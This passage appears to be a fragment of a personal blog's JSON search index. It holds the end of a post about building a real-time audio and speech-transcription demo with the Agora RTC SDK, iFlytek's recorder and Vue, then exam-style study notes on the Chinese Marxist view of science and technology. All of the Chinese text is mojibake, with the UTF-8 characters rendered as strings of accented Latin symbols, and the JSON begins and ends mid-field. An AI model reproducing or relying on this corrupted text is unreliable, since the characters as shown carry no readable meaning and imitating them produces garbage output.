AgoraRTC(å£°ç½‘çš„sdkï¼Œæä¾›å®æ—¶éŸ³è§†é¢‘æœåŠ¡) IatRecorder(è®¯é£å°è£…çš„ä¸€ä¸ªè¯­éŸ³è¯†åˆ«æ¥å£) Vue å‰ç«¯ä¸‰å‰‘å®¢ï¼ˆjsã€h5ã€CSSï¼‰è¿™ä¸‰ä¸ªåœ¨è°ƒè¯•è¿‡ç¨‹ä¸­å æ¯”å¾ˆå¤§ # å®ç° å®ç°éƒ¨åˆ†ä¸»è¦è®²å…³äºéŸ³é¢‘ä¼ è¾“ã€å½•éŸ³ã€å®æ—¶è¯­éŸ³è½¬å†™è¿™ä¸‰ç‚¹ï¼š éŸ³é¢‘ä¼ è¾“ éŸ³é¢‘ä¼ è¾“æ–¹é¢ã€‚å£°ç½‘æœ‰ç°æˆçš„demoæä¾›å­¦ä¹ ï¼Œä½¿ç”¨èµ·æ¥ç›¸å¯¹æ¯”è¾ƒç®€å•ã€‚ API-Examples-Web/Demo/selfRendering at main Â· AgoraIO/API-Examples-Web","tags":[{"name":"å£°ç½‘","slug":"å£°ç½‘","permalink":"https://hodlyounger.github.io/tags/%E5%A3%B0%E7%BD%91/"},{"name":"æ¯”èµ›","slug":"æ¯”èµ›","permalink":"https://hodlyounger.github.io/tags/%E6%AF%94%E8%B5%9B/"},{"name":"RTC","slug":"RTC","permalink":"https://hodlyounger.github.io/tags/RTC/"},{"name":"éŸ³è§†é¢‘","slug":"éŸ³è§†é¢‘","permalink":"https://hodlyounger.github.io/tags/%E9%9F%B3%E8%A7%86%E9%A2%91/"},{"name":"å‰ç«¯","slug":"å‰ç«¯","permalink":"https://hodlyounger.github.io/tags/%E5%89%8D%E7%AB%AF/"}],"categories":[{"name":"Z_æ‚è®°","slug":"Z-æ‚è®°","permalink":"https://hodlyounger.github.io/categories/Z-%E6%9D%82%E8%AE%B0/"}]},{"title":"ä¸­å›½é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è§‚","date":"2023-10-27T01:24:02.559Z","path":"Z_æ‚è®°/ä¸­å›½é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è§‚/","text":"æ¦‚è¿°ï¼šä¸­å›½é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è§‚ [toc] ç¬¬å››ç« ã€ç§‘å­¦æŠ€æœ¯ç¤¾ä¼šè®º 1. ä¸ºä»€ä¹ˆè¯´â€œç§‘å­¦æ˜¯ä¸€ç§åœ¨å†å²ä¸Šèµ·æ¨åŠ¨ä½œç”¨çš„ã€é©å‘½çš„åŠ›é‡â€ï¼Ÿ ç§‘å­¦æŠ€æœ¯æ˜¯å†å²å‘å±•çš„ç«è½¦å¤´ï¼Œæ”¹å˜äº†ç¤¾ä¼šå†å²è¿›ç¨‹ï¼Œé€ å°±äº†æ–°çš„ç¤¾ä¼šå½¢æ€;æ¨åŠ¨äº†ç”Ÿäº§åŠ›å†…éƒ¨å„è¦ç´ çš„å˜é©ï¼Œå¼•å‘äº†äº§ä¸šç»“æ„çš„è°ƒæ•´ã€ç»æµå½¢å¼çš„å˜åŒ–å’Œç»æµå¢é•¿æ–¹å¼çš„è½¬å˜ï¼Œé€ å°±äº†ç»æµè½¬å‹;äº§ç”Ÿäº†æŠ€æœ¯å¼‚åŒ–ç°è±¡ï¼Œè¦å¯¹å¼‚åŒ–çš„èµ„æœ¬ä¸»ä¹‰åˆ¶åº¦å±•å¼€æ‰¹åˆ¤ï¼Œæ›´å¥½åœ°å‘æŒ¥ç§‘å­¦æŠ€æœ¯çš„ç¤¾ä¼šåŠŸèƒ½ã€‚ ç§‘å­¦æŠ€æœ¯ä½œä¸ºç¤¾ä¼šå‘å±•çš„åŠ¨åŠ›,æ˜¯é©¬å…‹æ€ä¸»ä¹‰çš„åŸºæœ¨è§‚ç‚¹ã€‚ç§‘å­¦æ˜¯ç”Ÿäº§åŠ›çš„â€œçŸ¥è¯†çš„å½¢æ€â€ã€‚ä½œä¸ºç”Ÿäº§åŠ›çš„ç§‘å­¦æŠ€æœ¯ï¼Œèƒ½å¤Ÿå¤§å¤§æé«˜ç¤¾ä¼šç”Ÿäº§åŠ›æ°´å¹³ï¼Œæ¨åŠ¨ç€æ•´ä¸ªäººç±»ç‰©è´¨ç”Ÿäº§çš„è¿…çŒ›å‘å±•ã€‚ ä½œä¸ºå¼ºå¤§çš„ç²¾ç¥åŠ›é‡çš„ç§‘å­¦æŠ€æœ¯ï¼Œèƒ½å¤Ÿä¿ƒè¿›äººç±»æ€æƒ³çš„è§£æ”¾ï¼Œåœ¨äº§ä¸šé©å‘½çš„åŸºç¡€ä¸Šï¼Œæ¨åŠ¨ç¤¾ä¼šå˜é©ï¼Œå¯¹ç¤¾ä¼šç”Ÿäº§å…³ç³»äº§ç”Ÿæœ‰åŠ›å½±å“ã€‚ ä½œä¸ºäººç±»æœ€ç»ˆèµ°å‘ç™½ç”±çš„ç§‘å­¦æŠ€æœ¯ï¼Œèƒ½å¤Ÿä½œä¸ºè§£æ”¾çš„æ æ†ï¼Œå¢è¿›äººç±»ç²¾ç¥ç”Ÿæ´»çš„ä¸°å¯Œæ€§å’Œè‡ªæˆ‘å‘å±•èƒ½åŠ›ï¼Œæœ‰åŠ©äºå®ç°äººçš„å…¨é¢è‡ªç”±çš„å‘å±•ã€‚ 2. å¦‚ä½•çœ‹å¾…ç§‘å­¦æŠ€æœ¯å¯¹äººçš„å¼‚åŒ–å’Œå¯¹è‡ªç„¶çš„å¼‚åŒ–ï¼Ÿ ç§‘æŠ€å¼‚åŒ–å®è´¨ä¸Šæ˜¯åœ¨èµ„æœ¬ä¸»ä¹‰åˆ¶åº¦ä¸‹åŠ³åŠ¨å¼‚åŒ–å’Œäººçš„å¼‚åŒ–ä¸€ç§å¿…ç„¶ç»“æœã€‚ç”±äºåŠ³åŠ¨æ˜¯äººçš„æœ€æ ¹æœ¬æœ€ç°å®çš„å®è·µæ´»åŠ¨ï¼Œæ˜¯äººåŠäººç±»ç¤¾ä¼šå­˜åœ¨çš„æ ¹æœ¬æ–¹å¼ï¼ŒåŠ³åŠ¨çš„å¼‚åŒ–å¿…ç„¶å¸¦æ¥äººçš„å…¶ä»–ç¤¾ä¼šæ´»åŠ¨å’Œç¤¾ä¼šå…³ç³»çš„å…¨é¢å¼‚åŒ–ï¼Œç§‘å­¦æŠ€æœ¯ä¹Ÿä¸ä¾‹å¤–ï¼Œå› ä¸ºâ€œå®—æ•™ã€å®¶åº­ã€å›½å®¶ã€æ³•ã€é“å¾·ã€ç§‘å­¦ã€è‰ºæœ¯ç­‰ç­‰ï¼Œéƒ½ä¸è¿‡æ˜¯ç”Ÿäº§çš„ä¸€äº›ç‰¹æ®Šçš„æ–¹å¼ï¼Œå¹¶ä¸”å—ç”Ÿäº§çš„æ™®éè§„å¾‹çš„æ”¯é…ã€‚â€ å› æ­¤ï¼Œç§‘å­¦æŠ€æœ¯ä½œä¸ºåŠ³åŠ¨äº¦å³äººå¤„ç†è‡ªèº«ä¸è‡ªç„¶ç•Œå…³ç³»çš„ç¤¾ä¼šæ´»åŠ¨çš„äº§ç‰©ï¼Œä¹Ÿå¿…ç„¶éšç€èµ„æœ¬ä¸»ä¹‰ç¤¾ä¼šåŠ³åŠ¨çš„å¼‚åŒ–è€Œè¡¨ç°å‡ºå¼‚åŒ–çš„ç°è±¡ã€‚æœ€æ ¹æœ¬çš„æ˜¯è¦æ¶ˆç­å¯¹ç§‘å­¦æŠ€æœ¯çš„èµ„æœ¬ä¸»ä¹‰åˆ©ç”¨æ–¹å¼ï¼ŒæŠŠç°ä»£ç§‘å­¦æŠ€æœ¯ä»èµ„æœ¬ä¸»ä¹‰åˆ¶åº¦ä¸‹è§£æ”¾å‡ºæ¥ã€‚ä¹Ÿå°±æ˜¯è¯´åªæœ‰é€šè¿‡æ— äº§é˜¶çº§é©å‘½æ¥æœ€ç»ˆè§£å†³èµ„æœ¬ä¸»ä¹‰çš„ç§‘æŠ€å¼‚åŒ–é—®é¢˜ã€‚å½“ç„¶ï¼Œåœ¨é©¬å…‹æ€çœ‹æ¥ï¼Œå¼‚åŒ–çš„å®Œå…¨å…‹æœåªæœ‰åœ¨å…±äº§ä¸»ä¹‰ç¤¾ä¼šåˆ¶åº¦ä¸­æ‰èƒ½æœ€ç»ˆå®ç°ã€‚ 3. ç§‘å­¦æŠ€æœ¯çš„ç¤¾ä¼šä½“åˆ¶å’Œç»„ç»‡æœºæ„å¯¹ç§‘å­¦æŠ€æœ¯çš„å‘å±•æœ‰ä½•æ„ä¹‰ï¼Ÿ ç§‘å­¦æŠ€æœ¯çš„ç¤¾ä¼šå»ºåˆ¶æœ‰ä¸€ä¸ªå†å²è¿‡ç¨‹ã€‚ç»æµæ”¯æŒåˆ¶åº¦ã€æ³•å¾‹ä¿éšœä½“ç³»ç­‰ç§‘å­¦æŠ€æœ¯ä½“åˆ¶æ˜¯æ ¹æœ¬ï¼Œå„ç§ç»„ç»‡æœºæ„åŠå…¶ç§‘ç ”ç»„ç»‡è¿è¡Œæ˜¯ä¿è¯ï¼Œç§‘å­¦æŠ€æœ¯çš„ä¼¦ç†è§„èŒƒæ˜¯å¯¼å¼•ã€‚åœ¨ç§‘å­¦æŠ€æœ¯å‘å±•åº”ç”¨çš„æ–°é˜¶æ®µï¼Œç§‘å­¦æŠ€æœ¯çš„ç¤¾ä¼šå»ºåˆ¶å‘ˆç°å‡ºä¸€äº›æ–°ç‰¹ç‚¹ï¼Œå› æ­¤å¿…é¡»è¿›è¡Œç§‘å­¦æŠ€æœ¯ä½“åˆ¶æ”¹é©ï¼Œä»¥ä¿è¯ç§‘å­¦æŠ€æœ¯çš„è‰¯å¥½è¿è¡Œã€‚ ä½œä¸ºç¤¾ä¼šå»ºåˆ¶çš„ç§‘å­¦æŠ€æœ¯ä½“åˆ¶æ˜¯åœ¨ä¸€å®šç¤¾ä¼šä»·å€¼è§‚å¿µæ”¯é…ä¸‹ï¼Œä¾æ®ç›¸åº”çš„ç‰©è´¨è®¾å¤‡æ¡ä»¶å½¢æˆçš„ä¸€ç§ç¤¾ä¼šç»„ç»‡åˆ¶åº¦ï¼Œæ—¨åœ¨æ”¯æŒæ¨åŠ¨äººç±»å¯¹è‡ªç„¶çš„è®¤è¯†å’Œåˆ©ç”¨ã€‚ç§‘å­¦æŠ€æœ¯çš„ä½“åˆ¶åŒ–ä»¥ç›¸åº”çš„èŒä¸šåŒ–ä¸ºæ ¸å¿ƒï¼Œå…¶å†…æ¶µéšç€ç§‘å­¦æŠ€æœ¯çš„å‘å±•è€Œä¸æ–­æ‹“å±•å’Œä¸°å¯Œã€‚ç§‘å­¦æŠ€æœ¯çš„ç¤¾ä¼šä½“åˆ¶åŒ…æ‹¬:ç»„ç»‡é¢†å¯¼ä½“åˆ¶ã€ç»æµæ”¯æŒåˆ¶åº¦ã€æ³•å¾‹ä¿éšœä½“åˆ¶ã€äº¤æµä¸ä¼ æ’­ä½“åˆ¶ã€äººæ‰æ•™è‚²åŸ¹å…»åˆ¶åº¦ç­‰ã€‚ç§‘å­¦æŠ€æœ¯ä¸å…¶ä»–å„ç§äº‹ä¸šå¯†åˆ‡ç›¸å…³,éœ€è¦å»ºç«‹ç›¸åº”çš„ç»„ç»‡æœºæ„ä»¥ä¿è¯ç§‘å­¦æŠ€æœ¯æ´»åŠ¨çš„é¡ºåˆ©è¿›è¡Œã€‚ç§‘å­¦æŠ€æœ¯ç»„ç»‡æœºæ„éšç€å†å²çš„æ¼”åŒ–è€Œå˜åŒ–ï¼Œå…·æœ‰å„ç™½çš„ç‰¹ç‚¹å’ŒåŠŸèƒ½ï¼Œæ˜¯å®ç°ç§‘å­¦æŠ€æœ¯ç°ä»£åŒ–çš„ç»„ç»‡ä¿è¯ã€‚åœ¨ç§‘å­¦æŠ€æœ¯ç¤¾ä¼šå²ä¸Šå½¢æˆä¸å‘å±•èµ·æ¥çš„ç»„ç»‡æœºæ„æœ‰:ç§‘å­¦æŠ€æœ¯å†³ç­–ã€ç®¡ç†ä¸å’¨è¯¢æœºæ„ï¼Œç§‘å­¦æŠ€æœ¯æ´»åŠ¨ç»„ç»‡æœºæ„ï¼Œç§‘å­¦æŠ€æœ¯ä¼ æ’­æœºæ„ï¼Œç§‘å­¦æŠ€æœ¯äººæ‰åŸ¹å…»æœºæ„ã€‚ ã€ä»¥ä¸‹æ‘˜ç™½ç™¾åº¦è´´å§å¸–å­â€œç§‘å­¦æŠ€æœ¯çš„ç¤¾ä¼šä½“åˆ¶åŒ–åŠå…¶å¯¹ç§‘å­¦å‘å±•çš„æ„ä¹‰â€ã€‘ ç§‘å­¦æŠ€æœ¯ä½“åˆ¶åŒ–çš„å†…å®¹åŒ…æ‹¬:ç§‘å­¦æŠ€æœ¯çš„æŠ•å…¥ä½“åˆ¶ã€ç§‘æŠ€ç ”ç©¶çš„ç»“æ„æ¯”ä¾‹ã€ç§‘å­¦æŠ€æœ¯çš„æ³•å¾‹åˆ¶åº¦ã€ç§‘æŠ€ç ”ç©¶çš„ç®¡ç†ä½“åˆ¶ã€‚ ç§‘å­¦æŠ€æœ¯çš„ç¤¾ä¼šä½“åˆ¶åŒ–å¯¹ç§‘å­¦å‘å±•çš„æ„ä¹‰:1ã€å®ƒå¯ä»¥ç§¯èšç¤¾ä¼šä¸Šçš„åŠ›é‡æ¥è¿›è¡ŒæŸ‘åº”çš„ç§‘å­¦ç ”ç©¶;2ã€å½“ä»£ç§‘æŠ€æ´»åŠ¨çš„ç»“æ„ä¸­åŸºç¡€ç ”ç©¶å°†ä¼šæœ‰å¤§é‡çš„äººå‘˜å‚lä¸j;3ã€æ˜ç¡®çš„æ³•å¾‹ä»¥åŠç®¡ç†åˆ¶åº¦å°†ä¼šæ›´è¿›ä¸€æ­¥ä¿ƒè¿›ç§‘å­¦æŠ€æœ¯çš„å‘å±•ã€‚ 4. ä¸ºä»€ä¹ˆè¦å¯¹ç§‘å­¦æŠ€æœ¯å·¥ä½œè€…è¿›è¡Œä¼¦ç†è§„èŒƒï¼Ÿ ç§‘å­¦æŠ€æœ¯æ´»åŠ¨ä¸äººç±»å…¶ä»–æ´»åŠ¨ä¸€æ ·ï¼Œå»ºç«‹åœ¨è¯šä¿¡å’Œé“å¾·çš„åŸºç¡€ä¸Šã€‚ç°é˜¶æ®µï¼Œé»˜é¡¿çš„ç§‘å­¦çš„ç²¾ç¥æ°”è´¨å—åˆ°æŒ‘æˆ˜ï¼Œç§‘å­¦æŠ€æœ¯å·¥ä½œè€…æœ‰å¤±èŒƒè¡Œä¸ºï¼Œéœ€è¦åˆ¶å®šç›¸å…³ç§‘ç ”è¯šä¿¡æŒ‡å—å’Œå·¥ç¨‹å¸ˆä¼¦ç†å‡†åˆ™åŠ ä»¥è§„èŒƒã€‚ç§‘å­¦å·¥ä½œè€…è¿›è¡Œç§‘å­¦ç ”ç©¶å’ŒåŒ»å­¦å®è·µï¼Œå°¤å…¶æ˜¯è¿›è¡Œäººä½“å®éªŒå’ŒåŠ¨ç‰©å®éªŒï¼Œåº”è¯¥éµå¾ªç¤¾ä¼šä¼¦ç†ã€ç”Ÿå‘½ä¼¦ç†ã€åŠ¨ç‰©ä¼¦ç†ç­‰ã€‚æŠ€æœ¯å·¥ä½œè€…ï¼Œå°¤å…¶æ˜¯å·¥ç¨‹å¸ˆï¼Œåœ¨å·¥ç¨‹æŠ€æœ¯æ´»åŠ¨ä¸­ï¼Œåº”è¯¥éµå¾ªä¸€å®šçš„èŒä¸šä¼¦ç†å’Œç¤¾ä¼šä¼¦ç†å‡†åˆ™ï¼Œåº”è¯¥æ‰¿æ‹…å¯¹ç¤¾ä¼šã€ä¸“ä¸šã€é›‡ä¸»å’ŒåŒäº‹çš„è´£ä»»ï¼Œåº”è¯¥å¯¹å·¥ç¨‹çš„ç¯å¢ƒå½±å“è´Ÿæœ‰ç‰¹åˆ«çš„è´£ä»»ï¼Œè§„èŒƒç™½å·±çš„è¡Œä¸ºï¼Œä¸ºäººç±»ç¦ç¥‰å’Œç¯å¢ƒä¿æŠ¤æœåŠ¡ã€‚ 5. å¦‚ä½•ç†è§£ç§‘å­¦æŠ€æœ¯æ–‡åŒ–ä¸äººæ–‡æ–‡åŒ–ä¹‹é—´çš„å†²çªä¸åè°ƒï¼Ÿ (ä¸€ï¼‰ç¤¾ä¼šæ–‡åŒ–å¯¹ç§‘å­¦æŠ€æœ¯çš„å½±å“ ç§‘å­¦æŠ€æœ¯çš„äº§ç”Ÿå’Œå‘å±•éœ€è¦ä¸€å®šçš„ç¤¾ä¼šæ–‡åŒ–ç¯å¢ƒã€‚ç¤¾ä¼šæ–‡åŒ–ä¸ç§‘å­¦æŠ€æœ¯æ–‡åŒ–ç´§å¯†å…³è”ï¼Œå¹¶ç”±æ­¤å½±å“ç§‘å­¦æŠ€æœ¯çš„å‘å±•åŠå…¶åº”ç”¨ã€‚é»˜é¡¿åœ¨ã€Šåä¸ƒä¸–çºªè‹±æ ¼å…°çš„ç§‘å­¦ã€æŠ€æœ¯ä¸ç¤¾ä¼šã€‹ä¸­æå‡ºçš„â€œæ¸…æ•™ä¸»ä¹‰ä¿ƒè¿›è‹±å›½è¿‘ä»£ç§‘å­¦çš„åˆ¶åº¦å˜åŒ–â€ï¼Œä»¥åŠâ€œæçº¦ç‘Ÿéš¾é¢˜â€â€”â€”â€œè¿‘ä»£ç§‘å­¦ä¸ºä»€ä¹ˆæ²¡æœ‰åœ¨ä¸­å›½è¯ç”Ÿâ€çš„è§£ç­”ï¼Œå°±è¯´æ˜äº†è¿™ä¸€ç‚¹ã€‚ (äºŒï¼‰ç§‘å­¦æ–‡åŒ–ä¸äººæ–‡æ–‡åŒ–çš„åè°ƒ 1ï¼è¦é˜²æ­¢ç§‘å­¦åœ¨ç”Ÿæ´»ä¸–ç•Œã€è‡ªç„¶ä¸–ç•Œå¯¹äººæ–‡çš„åƒ­è¶Šæ‰€é€ æˆçš„ç§‘å­¦æ–‡åŒ–ä¸äººæ–‡æ–‡åŒ–ä¹‹é—´çš„å†²çªï¼Œæ·±åˆ»ç†è§£ç§‘å­¦çš„é™åº¦ï¼Œç”¨æ­£ç¡®çš„äººæ–‡ç†å¿µæŒ‡å¯¼æˆ‘ä»¬çš„ç”Ÿæ´»ã€‚ 2ï¼å¿…é¡»ä»¥ç¤¾ä¼šå…ˆè¿›æ–‡åŒ–æ¥å¼•é¢†ç§‘å­¦æŠ€æœ¯æ–‡åŒ–ï¼Œä½¿ç§‘å­¦æŠ€æœ¯å‘å±•å’Œåº”ç”¨ä¸ºç»æµç¤¾ä¼šå¥åº·å…¨é¢å‘å±•æœåŠ¡ã€‚å¾—åˆ°å¹¿æ³›æå€¡çš„ç¯å¢ƒç§‘å­¦æŠ€æœ¯å°±æ˜¯ä¸ºäº†åè°ƒäººä¸è‡ªç„¶ä¹‹é—´çš„å…³ç³»æ‰€åšçš„åŠªåŠ›ï¼Œæ˜¯ç§‘å­¦æŠ€æœ¯æ–‡åŒ–ä¸äººæ–‡æ–‡åŒ–â€”â€”ç»¿è‰²æ–‡åŒ–çš„è‰¯æ€§äº’åŠ¨äº§ç‰©ã€‚ 6. ç§‘å­¦æŠ€æœ¯çš„é£é™©æœ‰å“ªäº›ï¼Ÿå¦‚ä½•æ°å½“åœ°è¿›è¡Œç§‘å­¦æŠ€æœ¯é£é™©è¯„ä»·ä¸å†³ç­–ï¼Ÿ ç§‘å­¦æŠ€æœ¯çš„é£é™©åŒ…æ‹¬ç¯å¢ƒé£é™©ã€æ”¿æ²»é£é™©ã€ç»æµé£é™©ã€å¥åº·é£é™©å’Œä¼¦ç†é£é™©ç­‰ã€‚è¿™äº›é£é™©ä¼šå¼•å‘ä¸€ç³»åˆ—äº‰è®ºï¼Œé€ æˆè¯„ä»·å’Œå†³ç­–ä¸Šçš„å›°éš¾ã€‚ä¹ è¿‘å¹³æŒ‡å‡º:â€œè¦åŠ å¿«å»ºç«‹ç§‘æŠ€å’¨è¯¢æ”¯æ’‘è¡Œæ”¿å†³ç­–çš„ç§‘æŠ€å†³ç­–æœºåˆ¶ï¼ŒåŠ å¼ºç§‘æŠ€å†³ç­–å’¨è¯¢ç³»ç»Ÿï¼Œå»ºè®¾é«˜æ°´å¹³ç§‘æŠ€æ™ºåº“ã€‚è¦åŠ å¿«æ¨è¿›é‡å¤§ç§‘æŠ€å†³ç­–åˆ¶åº¦åŒ–ï¼Œè§£å†³å¥½å®é™…å­˜åœ¨çš„éƒ¨é—¨é¢†å¯¼æ‹è„‘è¢‹ã€ç§‘æŠ€ä¸“å®¶çœ‹é¢œè‰²è¡Œäº‹ç­‰é—®é¢˜ã€‚â€ è¦æ°å½“è¿›è¡Œç§‘å­¦æŠ€æœ¯é£é™©è¯„ä»·ä¸å†³ç­–ï¼Œå°±åº”è¯¥å…¨é¢è¯„ä»·ç§‘å­¦æŠ€æœ¯é£é™©â€”æ”¶ç›Šçš„å¤šä¸ªæ–¹é¢ï¼Œæ‰¹åˆ¤æ€§åœ°è€ƒå¯Ÿâ€œå†…éƒ¨&quot;å­˜æœ‰äº‰è®®çš„ç§‘å­¦çŸ¥è¯†æˆ–æŠ€æœ¯çŸ¥è¯†ï¼Œåˆ†æç›¸äº’ç«äº‰çš„åˆ©ç›Šé›†å›¢å’Œç¤¾ä¼šç»“æ„çš„&quot;å¤–éƒ¨&quot;æ”¿æ²»å­¦ï¼Œç†è§£ç§‘å­¦æŠ€æœ¯ä¸“å®¶çŸ¥è¯†å’Œå†³ç­–çš„å±€é™æ€§ã€å…¬ä¼—ç†è§£ç§‘å­¦çš„å¿…è¦æ€§ä»¥åŠå¤–è¡ŒçŸ¥è¯†çš„ä¼˜åŠ¿ï¼Œæ˜ç¡®æ”¿åºœã€ç§‘å­¦æŠ€æœ¯ä¸“å®¶ä»¥åŠå…¬ä¼—åœ¨ä¸ç§‘å­¦æŠ€æœ¯é£é™©ç›¸å…³çš„å…¬å…±å†³ç­–ä¸­çš„ä¸åŒä½œç”¨ï¼Œç¡®ç«‹å…¬ä¼—å‚ä¸å†³ç­–çš„å¯èƒ½æ–¹å¼ï¼Œä»è€Œå½¢æˆæœ€ä¼˜åŒ–çš„ç§‘å­¦æŠ€æœ¯å…¬å…±æ”¿ç­–æ¨¡å¼ï¼Œä»¥è¾¾åˆ°å¯¹ç§‘å­¦æŠ€æœ¯é£é™©ç¤¾ä¼šæœ‰æ•ˆæ²»ç†çš„ç›®çš„ã€‚ ç¬¬äº”ç« ã€ä¸­å›½é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è§‚ 1. ä¸ºä»€ä¹ˆè¯´æ–°æ—¶ä»£ä¸­å›½é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯æ˜¯ä¸€ä¸ªç§‘å­¦ã€å®Œæ•´çš„æ€æƒ³ç†è®ºä½“ç³»ï¼Ÿ æ¯›æ³½ä¸œã€é‚“å°å¹³ã€â€¦â€¦ã€èƒ¡é”¦æ¶›ã€ä¹ è¿‘å¹³çš„ç§‘å­¦æŠ€æœ¯æ€æƒ³ï¼Œæ˜¯åœ¨ä¸­å›½å…±äº§å…šé¢†å¯¼æˆ‘å›½ç§‘å­¦æŠ€æœ¯äº‹ä¸šå‘å±•å’Œè¿›è¡Œç¤¾ä¼šä¸»ä¹‰ç°ä»£åŒ–å»ºè®¾çš„ä¼Ÿå¤§æ—¶é—´ä¸­ï¼Œé€æ¸å½¢æˆã€å‘å±•å’Œå®Œå–„çš„ã€‚ ä¸­å›½é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è§‚æ˜¯åŸºäºé©¬å…‹æ€ã€æ©æ ¼æ–¯çš„ç§‘å­¦æŠ€æœ¯æ€æƒ³ï¼Œå¯¹å½“ä»£ç§‘å­¦æŠ€æœ¯æœºå™¨å‘å±•è§„å¾‹çš„æ¦‚æ‹¬å’Œæ€»ç»“ï¼Œæ˜¯é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è®ºçš„é‡è¦ç»„æˆéƒ¨åˆ†ã€‚ ä¸­å›½é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è§‚æ˜¯ä¸­å›½å…±äº§å…šäººé›†ä½“æ™ºæ…§çš„ç»“æ™¶ï¼Œæ˜¯å¯¹æ¯›æ³½ä¸œã€é‚“å°å¹³ã€â€¦â€¦ã€ä¹ è¿‘å¹³ç§‘å­¦æŠ€æœ¯æ€æƒ³çš„æ¦‚æ‹¬å’Œæ€»ç»“ï¼Œæ˜¯ä»–ä»¬ç§‘å­¦æŠ€æœ¯æ€æƒ³çš„ç†è®ºå‡åå’Œé£è·ƒï¼Œæ˜¯ä»–ä»¬ç§‘å­¦æŠ€æœ¯æ€æƒ³çš„å‡ç»ƒå’Œç²¾é«“ã€‚ ä¸­å›½é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è§‚çš„å†…å®¹ä¸°å¯Œï¼Œæ¶‰åŠäº†ç§‘å­¦æŠ€æœ¯çš„åŠŸèƒ½ã€ç›®æ ‡ã€æœºåˆ¶ã€æˆ˜ç•¥ã€äººæ‰å’Œæ–¹é’ˆç­‰é‡å¤§é—®é¢˜ï¼Œæ˜¯ä¸€ä¸ªç§‘å­¦ã€å®Œæ•´çš„æ€æƒ³ç†è®ºä½“ç³»ã€‚ 2. å¦‚ä½•ç†è§£ä¸­å›½é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è§‚çš„ç†è®ºç²¾é«“ï¼Ÿ ä¸­å›½é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è§‚æ¦‚æ‹¬å’Œæ€»ç»“äº†æ¯›æ³½ä¸œã€é‚“å°å¹³ã€Â·Â·Â·ã€ä¹ è¿‘å¹³ç­‰çš„ç§‘å­¦æŠ€æœ¯æ€æƒ³ï¼ŒåŒ…æ‹¬ç§‘å­¦æŠ€æœ¯çš„åŠŸèƒ½è§‚ã€æˆ˜ç•¥è§‚ã€äººæ‰è§‚ã€å’Œè°è§‚å’Œåˆ›æ–°è§‚çš„åŸºæœ¨å†…å®¹ï¼Œä½“ç°å‡ºæ—¶ä»£æ€§ã€å®è·µæ€§ã€ç§‘å­¦æ€§ã€åˆ›æ–°æ€§ã€è‡ªä¸»æ€§ã€äººæœ¬æ€§ç­‰ç‰¹å¾ï¼Œå»ºè®¾ä¸­å›½ç‰¹è‰²çš„åˆ›æ–°å‹å›½å®¶ï¼Œæ˜¯ä¸­å›½é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è§‚çš„å…·ä½“ä½“ç°ã€‚ä¸­å›½é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è§‚ï¼Œæ˜¯é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è§‚ä¸ä¸­å›½å…·ä½“ç§‘å­¦æŠ€æœ¯å®è·µç›¸ç»“åˆçš„äº§ç‰©ï¼Œæ˜¯é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è®ºçš„é‡è¦ç»„æˆéƒ¨åˆ†ã€‚ 3. å¦‚ä½•ç†è§£ä¹ è¿‘å¹³æ–°æ—¶ä»£ä¸­å›½ç‰¹è‰²ç¤¾ä¼šä¸»ä¹‰æ€æƒ³ä¸­çš„ç§‘å­¦æŠ€æœ¯è§‚çš„æ—¶ä»£æ„ä¹‰ï¼Ÿ ä¸­å›½é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è§‚çš„ä¸‰ä¸ªå†å²é˜¶æ®µæ˜¯å…¶å„è‡ªæ‰€å¤„çš„å†å²æ¡ä»¶æ‰€å†³å®šçš„ï¼Œæ˜¯å¯¹æ—¶ä»£èƒŒæ™¯å®äº‹æ±‚æ˜¯çš„åæ˜ ï¼Œå› æ­¤ç§‘å­¦æŠ€æœ¯æ€æƒ³éƒ½é•Œåˆ»äº†æ—¶ä»£çš„çƒ™å°ï¼Œåæ˜ äº†æ—¶ä»£çš„éœ€æ±‚ã€‚ ä¹ è¿‘å¹³æ–°æ—¶ä»£ä¸­å›½ç‰¹è‰²ç¤¾ä¼šä¸»ä¹‰æ€æƒ³ä¸­çš„ç§‘å­¦æŠ€æœ¯è§‚ï¼Œæ˜¯åœ¨ä¸­å›½ç‰¹è‰²ç¤¾ä¼šä¸»ä¹‰è¿›å…¥æ–°æ—¶ä»£çš„å†å²æ¡ä»¶ä¸‹å½¢æˆçš„ã€‚æ–°æ—¶ä»£ä¹‹â€œæ–°&quot;ï¼Œä¸€æ˜¯åœ¨äºæˆ‘ä»¬è¿›å…¥äº†ä¸€ä¸ªæ–°çš„å‘å±•é˜¶æ®µï¼Œå‘å±•ç¯å¢ƒã€å‘å±•æ¡ä»¶éƒ½å‘ç”Ÿäº†æ–°çš„å˜åŒ–ï¼Œç›®æ ‡ä»»åŠ¡ä¹Ÿå‘ç”Ÿäº†æ–°çš„å˜åŒ–;äºŒæ˜¯åœ¨äºæˆ‘ä»¬é¢ä¸´ç€æ–°çš„ç¤¾ä¼šä¸»ä¹‰ä¸»è¦çŸ›ç›¾;ä¸‰æ˜¯æˆ‘ä»¬è¿ˆå‘æ–°çš„å¥‹æ–—ç›®æ ‡ã€‚æ­£æ˜¯åŸºäºè¿™ä¸€æ–°æ—¶ä»£çš„&quot;æ–°&quot;ç‰¹å¾æ—¶ä»£èƒŒæ™¯ï¼Œä¹ 